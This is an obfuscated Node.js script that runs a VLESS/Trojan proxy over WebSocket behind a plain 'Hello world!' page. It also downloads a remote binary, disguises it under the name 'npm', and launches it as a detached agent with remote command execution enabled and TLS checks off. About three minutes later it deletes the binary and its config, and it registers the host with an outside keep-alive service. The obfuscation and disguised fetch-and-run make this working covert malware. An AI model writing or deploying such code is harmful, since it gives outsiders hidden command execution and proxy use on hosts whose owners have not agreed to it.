const _0x5eb71b=_0x3a6d;(function(_0x2bead1,_0x104ee8){const _0x3534b0={_0x4931c6:0x168,_0x1a7c8b:0x1a3,_0x2d1b12:0x1c6,_0x395e9e:0x1da,_0x1ddb2f:0x174,_0x96baf4:0x18c},_0x41a56b=_0x3a6d,_0x45eb31=_0x2bead1();while(!![]){try{const _0x1befbe=-parseInt(_0x41a56b(0x1ca))/0x1+-parseInt(_0x41a56b(0x1ae))/0x2*(-parseInt(_0x41a56b(0x173))/0x3)+parseInt(_0x41a56b(_0x3534b0._0x4931c6))/0x4*(-parseInt(_0x41a56b(_0x3534b0._0x1a7c8b))/0x5)+parseInt(_0x41a56b(_0x3534b0._0x2d1b12))/0x6+-parseInt(_0x41a56b(_0x3534b0._0x395e9e))/0x7+-parseInt(_0x41a56b(_0x3534b0._0x1ddb2f))/0x8+parseInt(_0x41a56b(0x1bd))/0x9*(parseInt(_0x41a56b(_0x3534b0._0x96baf4))/0xa);if(_0x1befbe===_0x104ee8)break;else _0x45eb31['push'](_0x45eb31['shift']());}catch(_0x54de26){_0x45eb31['push'](_0x45eb31['shift']());}}}(_0x5bf6,0xc60a3));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x5eb71b(0x1a6)),net=require(_0x5eb71b(0x1c7)),path=require(_0x5eb71b(0x196)),crypto=require('crypto'),{Buffer}=require(_0x5eb71b(0x1de)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x5eb71b(0x184)]['UUID']||_0x5eb71b(0x1c1),NEZHA_SERVER=process[_0x5eb71b(0x184)][_0x5eb71b(0x1e0)]||'',NEZHA_PORT=process['env'][_0x5eb71b(0x191)]||'',NEZHA_KEY=process[_0x5eb71b(0x184)][_0x5eb71b(0x16b)]||'',DOMAIN=process['env']['DOMAIN']||_0x5eb71b(0x18f),AUTO_ACCESS=process[_0x5eb71b(0x184)]['AUTO_ACCESS']||!![],WSPATH=process['env'][_0x5eb71b(0x1ab)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x5eb71b(0x184)][_0x5eb71b(0x1b6)]||_0x5eb71b(0x19a),NAME=process[_0x5eb71b(0x184)][_0x5eb71b(0x1b5)]||'',PORT=process[_0x5eb71b(0x184)][_0x5eb71b(0x180)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0xfc19cb={_0x3b78c8:0x1e1,_0x43101c:0x1ac},_0x500327=_0x5eb71b;try{const _0x4bb00d=await axios[_0x500327(0x1c0)](_0x500327(_0xfc19cb._0x3b78c8)),_0x486904=_0x4bb00d[_0x500327(0x176)];ISP=(_0x486904[_0x500327(0x1d8)]+'-'+_0x486904[_0x500327(0x1a8)])['replace'](/ /g,'_');}catch(_0x353900){ISP=_0x500327(_0xfc19cb._0x43101c);}};GetISP();const httpServer=http['createServer']((_0x9a1c11,_0x20ab5f)=>{const _0x5462cf={_0x57d0db:0x185,_0x2209bb:0x1a1,_0x1779b6:0x1cc,_0x2190ad:0x185,_0x45bcd2:0x1d2,_0x1edd24:0x190,_0x3d8517:0x1bb,_0x185d27:0x16e,_0xbb3b1d:0x17e,_0x80cb53:0x1c4,_0x1a4ae2:0x187},_0x354570={_0x35ce91:0x181,_0x4cd081:0x187,_0x26cacd:0x181,_0x557f87:0x187},_0xfbf3f7=_0x5eb71b;if(_0x9a1c11[_0xfbf3f7(_0x5462cf._0x57d0db)]==='/'){const _0x324fdd=path[_0xfbf3f7(0x19c)](__dirname,'index.html');fs[_0xfbf3f7(_0x5462cf._0x2209bb)](_0x324fdd,_0xfbf3f7(_0x5462cf._0x1779b6),(_0x37b6cf,_0x40ebc0)=>{const _0x5371a3=_0xfbf3f7;if(_0x37b6cf){_0x20ab5f[_0x5371a3(0x17e)](0xc8,{'Content-Type':_0x5371a3(_0x354570._0x35ce91)}),_0x20ab5f[_0x5371a3(_0x354570._0x4cd081)](_0x5371a3(0x1cf));return;}_0x20ab5f['writeHead'](0xc8,{'Content-Type':_0x5371a3(_0x354570._0x26cacd)}),_0x20ab5f[_0x5371a3(_0x354570._0x557f87)](_0x40ebc0);});return;}else{if(_0x9a1c11[_0xfbf3f7(_0x5462cf._0x2190ad)]==='/'+SUB_PATH){const _0x4358ee=NAME?NAME+'-'+ISP:ISP,_0x77cf95=_0xfbf3f7(0x1d3)+UUID+'@'+DOMAIN+_0xfbf3f7(_0x5462cf._0x45bcd2)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0xfbf3f7(0x175)+WSPATH+'#'+_0x4358ee,_0x2baea8=_0xfbf3f7(_0x5462cf._0x1edd24)+UUID+'@'+DOMAIN+_0xfbf3f7(_0x5462cf._0x3d8517)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0xfbf3f7(0x175)+WSPATH+'#'+_0x4358ee,_0x5a90be=_0x77cf95+'\x0a'+_0x2baea8,_0x599d3c=Buffer[_0xfbf3f7(0x1b2)](_0x5a90be)[_0xfbf3f7(_0x5462cf._0x185d27)]('base64');_0x20ab5f[_0xfbf3f7(_0x5462cf._0xbb3b1d)](0xc8,{'Content-Type':_0xfbf3f7(_0x5462cf._0x80cb53)}),_0x20ab5f['end'](_0x599d3c+'\x0a');}else _0x20ab5f['writeHead'](0x194,{'Content-Type':_0xfbf3f7(0x1c4)}),_0x20ab5f[_0xfbf3f7(_0x5462cf._0x1a4ae2)](_0xfbf3f7(0x1a7));}}),wss=new WebSocket[(_0x5eb71b(0x165))]({'server':httpServer}),uuid=UUID[_0x5eb71b(0x1cb)](/-/g,''),DNS_SERVERS=[_0x5eb71b(0x1a9),_0x5eb71b(0x1d4)];function resolveHost(_0x322e3b){const _0xa5f44d={_0x3b6b37:0x186};return new Promise((_0x483249,_0xbd4fcc)=>{const _0x30143e={_0xda7d72:0x1c0},_0x2da202=_0x3a6d;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x2da202(_0xa5f44d._0x3b6b37)](_0x322e3b)){_0x483249(_0x322e3b);return;}let _0x2f8bd4=0x0;function _0x4c2bf1(){const _0x4d2f47={_0x3fb6b5:0x1dd,_0x29384a:0x176},_0x492e79=_0x2da202;if(_0x2f8bd4>=DNS_SERVERS[_0x492e79(0x198)]){_0xbd4fcc(new Error(_0x492e79(0x195)+_0x322e3b+_0x492e79(0x1c9)));return;}const _0x2ddb32=DNS_SERVERS[_0x2f8bd4];_0x2f8bd4++;const _0x38af7e=_0x492e79(0x1a2)+encodeURIComponent(_0x322e3b)+'&type=A';axios[_0x492e79(_0x30143e._0xda7d72)](_0x38af7e,{'timeout':0x1388,'headers':{'Accept':_0x492e79(0x1c8)}})[_0x492e79(0x1af)](_0x3708fc=>{const _0x51de39=_0x492e79,_0x3a57a2=_0x3708fc[_0x51de39(0x176)];if(_0x3a57a2[_0x51de39(_0x4d2f47._0x3fb6b5)]===0x0&&_0x3a57a2[_0x51de39(0x194)]&&_0x3a57a2[_0x51de39(0x194)][_0x51de39(0x198)]>0x0){const _0x1bfccc=_0x3a57a2['Answer'][_0x51de39(0x18a)](_0x2f6404=>_0x2f6404[_0x51de39(0x1d1)]===0x1);if(_0x1bfccc){_0x483249(_0x1bfccc[_0x51de39(_0x4d2f47._0x29384a)]);return;}}_0x4c2bf1();})[_0x492e79(0x189)](_0x30512e=>{_0x4c2bf1();});}_0x4c2bf1();});}function handleVlessConnection(_0x73b78d,_0x3a6a7b){const _0x11b4ce={_0x807764:0x16f,_0x3b345c:0x16f,_0x347dc7:0x1d5,_0x2cd8a1:0x16f,_0x4d5855:0x1af,_0xcded79:0x189},_0x1b85f3={_0xec3ed6:0x1db},_0x1c4a04={_0x2d3418:0x16f,_0x3ae9ec:0x183,_0x2f150b:0x19b},_0x2da3ef={_0x524203:0x183},_0x525cc6=_0x5eb71b,[_0x38ae9d]=_0x3a6a7b,_0x222e68=_0x3a6a7b[_0x525cc6(_0x11b4ce._0x807764)](0x1,0x11);if(!_0x222e68[_0x525cc6(0x1a5)]((_0x3c8580,_0x31b0d9)=>_0x3c8580==parseInt(uuid[_0x525cc6(0x17c)](_0x31b0d9*0x2,0x2),0x10)))return![];let _0x3f7547=_0x3a6a7b[_0x525cc6(0x16f)](0x11,0x12)['readUInt8']()+0x13;const _0x5ca273=_0x3a6a7b[_0x525cc6(0x16f)](_0x3f7547,_0x3f7547+=0x2)[_0x525cc6(0x1aa)](0x0),_0x354c74=_0x3a6a7b[_0x525cc6(_0x11b4ce._0x3b345c)](_0x3f7547,_0x3f7547+=0x1)['readUInt8'](),_0x4facd8=_0x354c74==0x1?_0x3a6a7b['slice'](_0x3f7547,_0x3f7547+=0x4)[_0x525cc6(0x19c)]('.'):_0x354c74==0x2?new TextDecoder()[_0x525cc6(0x1ba)](_0x3a6a7b[_0x525cc6(0x16f)](_0x3f7547+0x1,_0x3f7547+=0x1+_0x3a6a7b[_0x525cc6(_0x11b4ce._0x807764)](_0x3f7547,_0x3f7547+0x1)[_0x525cc6(_0x11b4ce._0x347dc7)]())):_0x354c74==0x3?_0x3a6a7b[_0x525cc6(_0x11b4ce._0x2cd8a1)](_0x3f7547,_0x3f7547+=0x10)['reduce']((_0x24c327,_0x22f8c4,_0x25f483,_0x449121)=>_0x25f483%0x2?_0x24c327['concat'](_0x449121[_0x525cc6(0x16f)](_0x25f483-0x1,_0x25f483+0x1)):_0x24c327,[])[_0x525cc6(0x1e2)](_0x3e7e74=>_0x3e7e74[_0x525cc6(0x1aa)](0x0)[_0x525cc6(0x16e)](0x10))['join'](':'):'';_0x73b78d[_0x525cc6(0x1b0)](new Uint8Array([_0x38ae9d,0x0]));const _0x5b2bfd=createWebSocketStream(_0x73b78d);return resolveHost(_0x4facd8)[_0x525cc6(_0x11b4ce._0x4d5855)](_0x31d7d5=>{const _0xb2ead8={_0x473062:0x19b},_0x5e8790=_0x525cc6;net['connect']({'host':_0x31d7d5,'port':_0x5ca273},function(){const _0x598aad=_0x3a6d;this[_0x598aad(0x182)](_0x3a6a7b['slice'](_0x3f7547)),_0x5b2bfd['on']('error',()=>{})[_0x598aad(0x19b)](this)['on'](_0x598aad(0x183),()=>{})[_0x598aad(_0xb2ead8._0x473062)](_0x5b2bfd);})['on'](_0x5e8790(_0x2da3ef._0x524203),()=>{});})[_0x525cc6(_0x11b4ce._0xcded79)](_0x4b7fb0=>{const _0x354099=_0x525cc6;net[_0x354099(_0x1b85f3._0xec3ed6)]({'host':_0x4facd8,'port':_0x5ca273},function(){const _0x31fc54=_0x354099;this['write'](_0x3a6a7b[_0x31fc54(_0x1c4a04._0x2d3418)](_0x3f7547)),_0x5b2bfd['on'](_0x31fc54(_0x1c4a04._0x3ae9ec),()=>{})[_0x31fc54(_0x1c4a04._0x2f150b)](this)['on'](_0x31fc54(0x183),()=>{})[_0x31fc54(0x19b)](_0x5b2bfd);})['on'](_0x354099(0x183),()=>{});}),!![];}function _0x5bf6(){const _0x36019d=['2096','unlink','update','decode',':443?security=tls&sni=','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','107226OMiEPP','https://','Server\x20is\x20running\x20on\x20port\x20','get','c09da076-d978-4e22-9ef9-e8f40b4c99e6','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','log','text/plain','/bin/bash','7308900GVgOjz','net','application/dns-json','\x20with\x20all\x20DNS\x20servers','575637UCDYTL','replace','utf8','sha224','true','Hello\x20world!','stream','type',':443?encryption=none&security=tls&sni=','vless://','1.1.1.1','readUInt8','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','https://arm64.ssss.nyc.mn/v1','country_code','https://oooo.serv00.net/add-url','1435042tCtLtd','connect','8443','Status','buffer','hex','NEZHA_SERVER','https://api.ip.sb/geoip','map','Server','createWriteStream','arm64','4gwnYbH','post','443','NEZHA_KEY','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','https://amd64.ssss.nyc.mn/v1','toString','slice','npm\x20is\x20already\x20running,\x20skip\x20running...','arch','finish','176145ehpQVj','9488552MvfKKK','&path=%2F','data','listen','npm\x20download\x20successfully','writeFileSync','concat','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','substr','--tls','writeHead','pop','PORT','text/html','write','error','env','url','test','end','once','catch','find','npm','2280Awqzgy','https://amd64.ssss.nyc.mn/agent','connection','1234.abc.com','trojan://','NEZHA_PORT','reduce','client_secret:\x20','Answer','Failed\x20to\x20resolve\x20','path','createHash','length','error:\x20','wanfanny','pipe','join','digest','chmod\x20+x\x20npm','utf-8','close','readFile','https://dns.google/resolve?name=','6076870vbsoFZ','https://arm64.ssss.nyc.mn/agent','every','axios','Not\x20Found\x0a','isp','8.8.4.4','readUInt16BE','WSPATH','Unknown','application/json','2tGbEkv','then','send','split','from','arm','includes','NAME','SUB_PATH'];_0x5bf6=function(){return _0x36019d;};return _0x5bf6();}function handleTrojanConnection(_0x46e740,_0x46c6d5){const _0x15cde5={_0x176d48:0x16e,_0x216a05:0x197,_0x387955:0x1df,_0x4dbf0a:0x16f,_0x4c3cf7:0x19c,_0x3bca51:0x16f,_0x545dfa:0x16e,_0x3e29cc:0x16f,_0xbf72ab:0x192,_0x57053e:0x198,_0x395b92:0x1af,_0x662a1f:0x189},_0x4875b6={_0x1c9ece:0x183},_0x30425b={_0x526f09:0x182,_0xfe4412:0x183},_0x7aaaf3=_0x5eb71b;try{if(_0x46c6d5[_0x7aaaf3(0x198)]<0x3a)return![];const _0x3db8f3=_0x46c6d5[_0x7aaaf3(0x16f)](0x0,0x38)[_0x7aaaf3(_0x15cde5._0x176d48)](),_0x41a72f=[UUID];let _0x56272c=null;for(const _0x278f55 of _0x41a72f){const _0x5ce7d6=crypto[_0x7aaaf3(_0x15cde5._0x216a05)](_0x7aaaf3(0x1cd))[_0x7aaaf3(0x1b9)](_0x278f55)[_0x7aaaf3(0x19d)](_0x7aaaf3(_0x15cde5._0x387955));if(_0x5ce7d6===_0x3db8f3){_0x56272c=_0x278f55;break;}}if(!_0x56272c)return![];let _0x3ece1a=0x38;_0x46c6d5[_0x3ece1a]===0xd&&_0x46c6d5[_0x3ece1a+0x1]===0xa&&(_0x3ece1a+=0x2);const _0x312255=_0x46c6d5[_0x3ece1a];if(_0x312255!==0x1)return![];_0x3ece1a+=0x1;const _0x277b84=_0x46c6d5[_0x3ece1a];_0x3ece1a+=0x1;let _0x308b81,_0x56cf48;if(_0x277b84===0x1)_0x308b81=_0x46c6d5[_0x7aaaf3(_0x15cde5._0x4dbf0a)](_0x3ece1a,_0x3ece1a+0x4)[_0x7aaaf3(_0x15cde5._0x4c3cf7)]('.'),_0x3ece1a+=0x4;else{if(_0x277b84===0x3){const _0x282144=_0x46c6d5[_0x3ece1a];_0x3ece1a+=0x1,_0x308b81=_0x46c6d5[_0x7aaaf3(_0x15cde5._0x3bca51)](_0x3ece1a,_0x3ece1a+_0x282144)[_0x7aaaf3(_0x15cde5._0x545dfa)](),_0x3ece1a+=_0x282144;}else{if(_0x277b84===0x4)_0x308b81=_0x46c6d5[_0x7aaaf3(_0x15cde5._0x3e29cc)](_0x3ece1a,_0x3ece1a+0x10)[_0x7aaaf3(_0x15cde5._0xbf72ab)]((_0xbbe9ff,_0x2d67d0,_0xccdd8e,_0x441e9c)=>_0xccdd8e%0x2?_0xbbe9ff[_0x7aaaf3(0x17a)](_0x441e9c[_0x7aaaf3(0x16f)](_0xccdd8e-0x1,_0xccdd8e+0x1)):_0xbbe9ff,[])[_0x7aaaf3(0x1e2)](_0x36db96=>_0x36db96[_0x7aaaf3(0x1aa)](0x0)['toString'](0x10))[_0x7aaaf3(_0x15cde5._0x4c3cf7)](':'),_0x3ece1a+=0x10;else return![];}}_0x56cf48=_0x46c6d5['readUInt16BE'](_0x3ece1a),_0x3ece1a+=0x2;_0x3ece1a<_0x46c6d5[_0x7aaaf3(_0x15cde5._0x57053e)]&&_0x46c6d5[_0x3ece1a]===0xd&&_0x46c6d5[_0x3ece1a+0x1]===0xa&&(_0x3ece1a+=0x2);const _0x47beee=createWebSocketStream(_0x46e740);return resolveHost(_0x308b81)[_0x7aaaf3(_0x15cde5._0x395b92)](_0x111fa6=>{const _0x286940={_0x3fe71b:0x198,_0x4f3619:0x16f},_0x1e9ca1=_0x7aaaf3;net[_0x1e9ca1(0x1db)]({'host':_0x111fa6,'port':_0x56cf48},function(){const _0x3439de=_0x1e9ca1;_0x3ece1a<_0x46c6d5[_0x3439de(_0x286940._0x3fe71b)]&&this[_0x3439de(0x182)](_0x46c6d5[_0x3439de(_0x286940._0x4f3619)](_0x3ece1a)),_0x47beee['on'](_0x3439de(0x183),()=>{})[_0x3439de(0x19b)](this)['on'](_0x3439de(0x183),()=>{})[_0x3439de(0x19b)](_0x47beee);})['on'](_0x1e9ca1(0x183),()=>{});})[_0x7aaaf3(_0x15cde5._0x662a1f)](_0x5ccf9d=>{const _0x5876bc=_0x7aaaf3;net['connect']({'host':_0x308b81,'port':_0x56cf48},function(){const _0x328f40=_0x3a6d;_0x3ece1a<_0x46c6d5[_0x328f40(0x198)]&&this[_0x328f40(_0x30425b._0x526f09)](_0x46c6d5['slice'](_0x3ece1a)),_0x47beee['on'](_0x328f40(_0x30425b._0xfe4412),()=>{})[_0x328f40(0x19b)](this)['on'](_0x328f40(_0x30425b._0xfe4412),()=>{})['pipe'](_0x47beee);})['on'](_0x5876bc(_0x4875b6._0x1c9ece),()=>{});}),!![];}catch(_0x24b855){return![];}}wss['on'](_0x5eb71b(0x18e),(_0x3e6b42,_0x21d3b3)=>{const _0x397414={_0x21d42d:0x188,_0xbbed51:0x183},_0xa04a99={_0x533a37:0x16f},_0x4d42e3=_0x5eb71b,_0x378d26=_0x21d3b3['url']||'';_0x3e6b42[_0x4d42e3(_0x397414._0x21d42d)]('message',_0x524393=>{const _0xa14467=_0x4d42e3;if(_0x524393[_0xa14467(0x198)]>0x11&&_0x524393[0x0]===0x0){const _0x3a60cc=_0x524393[_0xa14467(_0xa04a99._0x533a37)](0x1,0x11),_0x583985=_0x3a60cc[_0xa14467(0x1a5)]((_0x2ab40b,_0x42554c)=>_0x2ab40b==parseInt(uuid[_0xa14467(0x17c)](_0x42554c*0x2,0x2),0x10));if(_0x583985){!handleVlessConnection(_0x3e6b42,_0x524393)&&_0x3e6b42['close']();return;}}!handleTrojanConnection(_0x3e6b42,_0x524393)&&_0x3e6b42[_0xa14467(0x1a0)]();})['on'](_0x4d42e3(_0x397414._0xbbed51),()=>{});});const getDownloadUrl=()=>{const _0x36e3f9={_0x2b10cd:0x171,_0x424cd7:0x167,_0x32618e:0x1a4,_0x19e85b:0x16d,_0x4bc711:0x18d},_0x4ad3a7=_0x5eb71b,_0x3261f6=os[_0x4ad3a7(_0x36e3f9._0x2b10cd)]();return _0x3261f6===_0x4ad3a7(0x1b3)||_0x3261f6===_0x4ad3a7(_0x36e3f9._0x424cd7)||_0x3261f6==='aarch64'?!NEZHA_PORT?_0x4ad3a7(0x1d7):_0x4ad3a7(_0x36e3f9._0x32618e):!NEZHA_PORT?_0x4ad3a7(_0x36e3f9._0x19e85b):_0x4ad3a7(_0x36e3f9._0x4bc711);},downloadFile=async()=>{const _0x46f1d3={_0x3f6785:0x1d0},_0x3752c5={_0x11f25f:0x172,_0x8cb069:0x183},_0x391f94=_0x5eb71b;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x505c99=getDownloadUrl(),_0x1f27e6=await axios({'method':_0x391f94(0x1c0),'url':_0x505c99,'responseType':_0x391f94(_0x46f1d3._0x3f6785)}),_0x229083=fs[_0x391f94(0x166)](_0x391f94(0x18b));return _0x1f27e6[_0x391f94(0x176)][_0x391f94(0x19b)](_0x229083),new Promise((_0x50fab5,_0x1175bf)=>{const _0x1b5609={_0x156905:0x178},_0x5245a7=_0x391f94;_0x229083['on'](_0x5245a7(_0x3752c5._0x11f25f),()=>{const _0xa2692=_0x5245a7;console['log'](_0xa2692(_0x1b5609._0x156905)),exec(_0xa2692(0x19e),_0x4ce214=>{if(_0x4ce214)_0x1175bf(_0x4ce214);_0x50fab5();});}),_0x229083['on'](_0x5245a7(_0x3752c5._0x8cb069),_0x1175bf);});}catch(_0x331bd3){throw _0x331bd3;}},runnz=async()=>{const _0x471322={_0x41d563:0x1c3,_0x1bd30f:0x170,_0x5967cb:0x16a,_0x4c9da9:0x1b4,_0x3c4135:0x17f,_0x43a017:0x1b4,_0x3284ca:0x1ce,_0x448042:0x16c,_0x4b3da3:0x1d6,_0xeeee5e:0x1c5,_0x4bbdce:0x183},_0x1311d0=_0x5eb71b;try{const _0x32b8f8=execSync(_0x1311d0(0x17b),{'encoding':_0x1311d0(0x19f)});if(_0x32b8f8['trim']()!==''){console[_0x1311d0(_0x471322._0x41d563)](_0x1311d0(_0x471322._0x1bd30f));return;}}catch(_0x1b7605){}await downloadFile();let _0x3114b6='',_0x23d5ec=[_0x1311d0(_0x471322._0x5967cb),_0x1311d0(0x1dc),_0x1311d0(0x1b7),'2087','2083','2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3d7f80=_0x23d5ec[_0x1311d0(_0x471322._0x4c9da9)](NEZHA_PORT)?_0x1311d0(0x17d):'';_0x3114b6='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x3d7f80+_0x1311d0(0x1c2);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x85f234=NEZHA_SERVER[_0x1311d0(0x1b4)](':')?NEZHA_SERVER[_0x1311d0(0x1b1)](':')[_0x1311d0(_0x471322._0x3c4135)]():'',_0x46f3a0=_0x23d5ec[_0x1311d0(_0x471322._0x43a017)](_0x85f234)?_0x1311d0(_0x471322._0x3284ca):'false',_0x96aa03=_0x1311d0(0x193)+NEZHA_KEY+_0x1311d0(_0x471322._0x448042)+NEZHA_SERVER+_0x1311d0(_0x471322._0x4b3da3)+_0x46f3a0+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x1311d0(0x179)]('config.yaml',_0x96aa03);}_0x3114b6='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x1311d0(0x1c3)](_0x1311d0(0x1bc));return;}}try{exec(_0x3114b6,{'shell':_0x1311d0(_0x471322._0xeeee5e)},_0x3c3dc6=>{const _0x2df783=_0x1311d0;if(_0x3c3dc6)console[_0x2df783(0x183)]('npm\x20running\x20error:',_0x3c3dc6);else console['log']('npm\x20is\x20running');});}catch(_0x1c2ef1){console[_0x1311d0(_0x471322._0x4bbdce)](_0x1311d0(0x199)+_0x1c2ef1);}};function _0x3a6d(_0x24f999,_0x189ea4){const _0x5bf6eb=_0x5bf6();return _0x3a6d=function(_0x3a6db4,_0x2d30f8){_0x3a6db4=_0x3a6db4-0x165;let _0x450359=_0x5bf6eb[_0x3a6db4];return _0x450359;},_0x3a6d(_0x24f999,_0x189ea4);}async function addAccessTask(){const _0x2f4477={_0x5c5318:0x1be,_0x56907d:0x1ad},_0x1a1143=_0x5eb71b;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x5546c0=_0x1a1143(_0x2f4477._0x5c5318)+DOMAIN;try{const _0x59a553=await axios[_0x1a1143(0x169)](_0x1a1143(0x1d9),{'url':_0x5546c0},{'headers':{'Content-Type':_0x1a1143(_0x2f4477._0x56907d)}});console[_0x1a1143(0x1c3)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x255a85){}}const delFiles=()=>{const _0xc7a65f={_0x39b932:0x1b8,_0x4ad2fe:0x18b},_0xd37172=_0x5eb71b;fs[_0xd37172(_0xc7a65f._0x39b932)](_0xd37172(_0xc7a65f._0x4ad2fe),()=>{}),fs['unlink']('config.yaml',()=>{});};httpServer[_0x5eb71b(0x177)](PORT,()=>{const _0x2c50c5={_0x1deae2:0x1c3,_0x5a7365:0x1bf},_0x12d07d=_0x5eb71b;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x12d07d(_0x2c50c5._0x1deae2)](_0x12d07d(_0x2c50c5._0x5a7365)+PORT);});
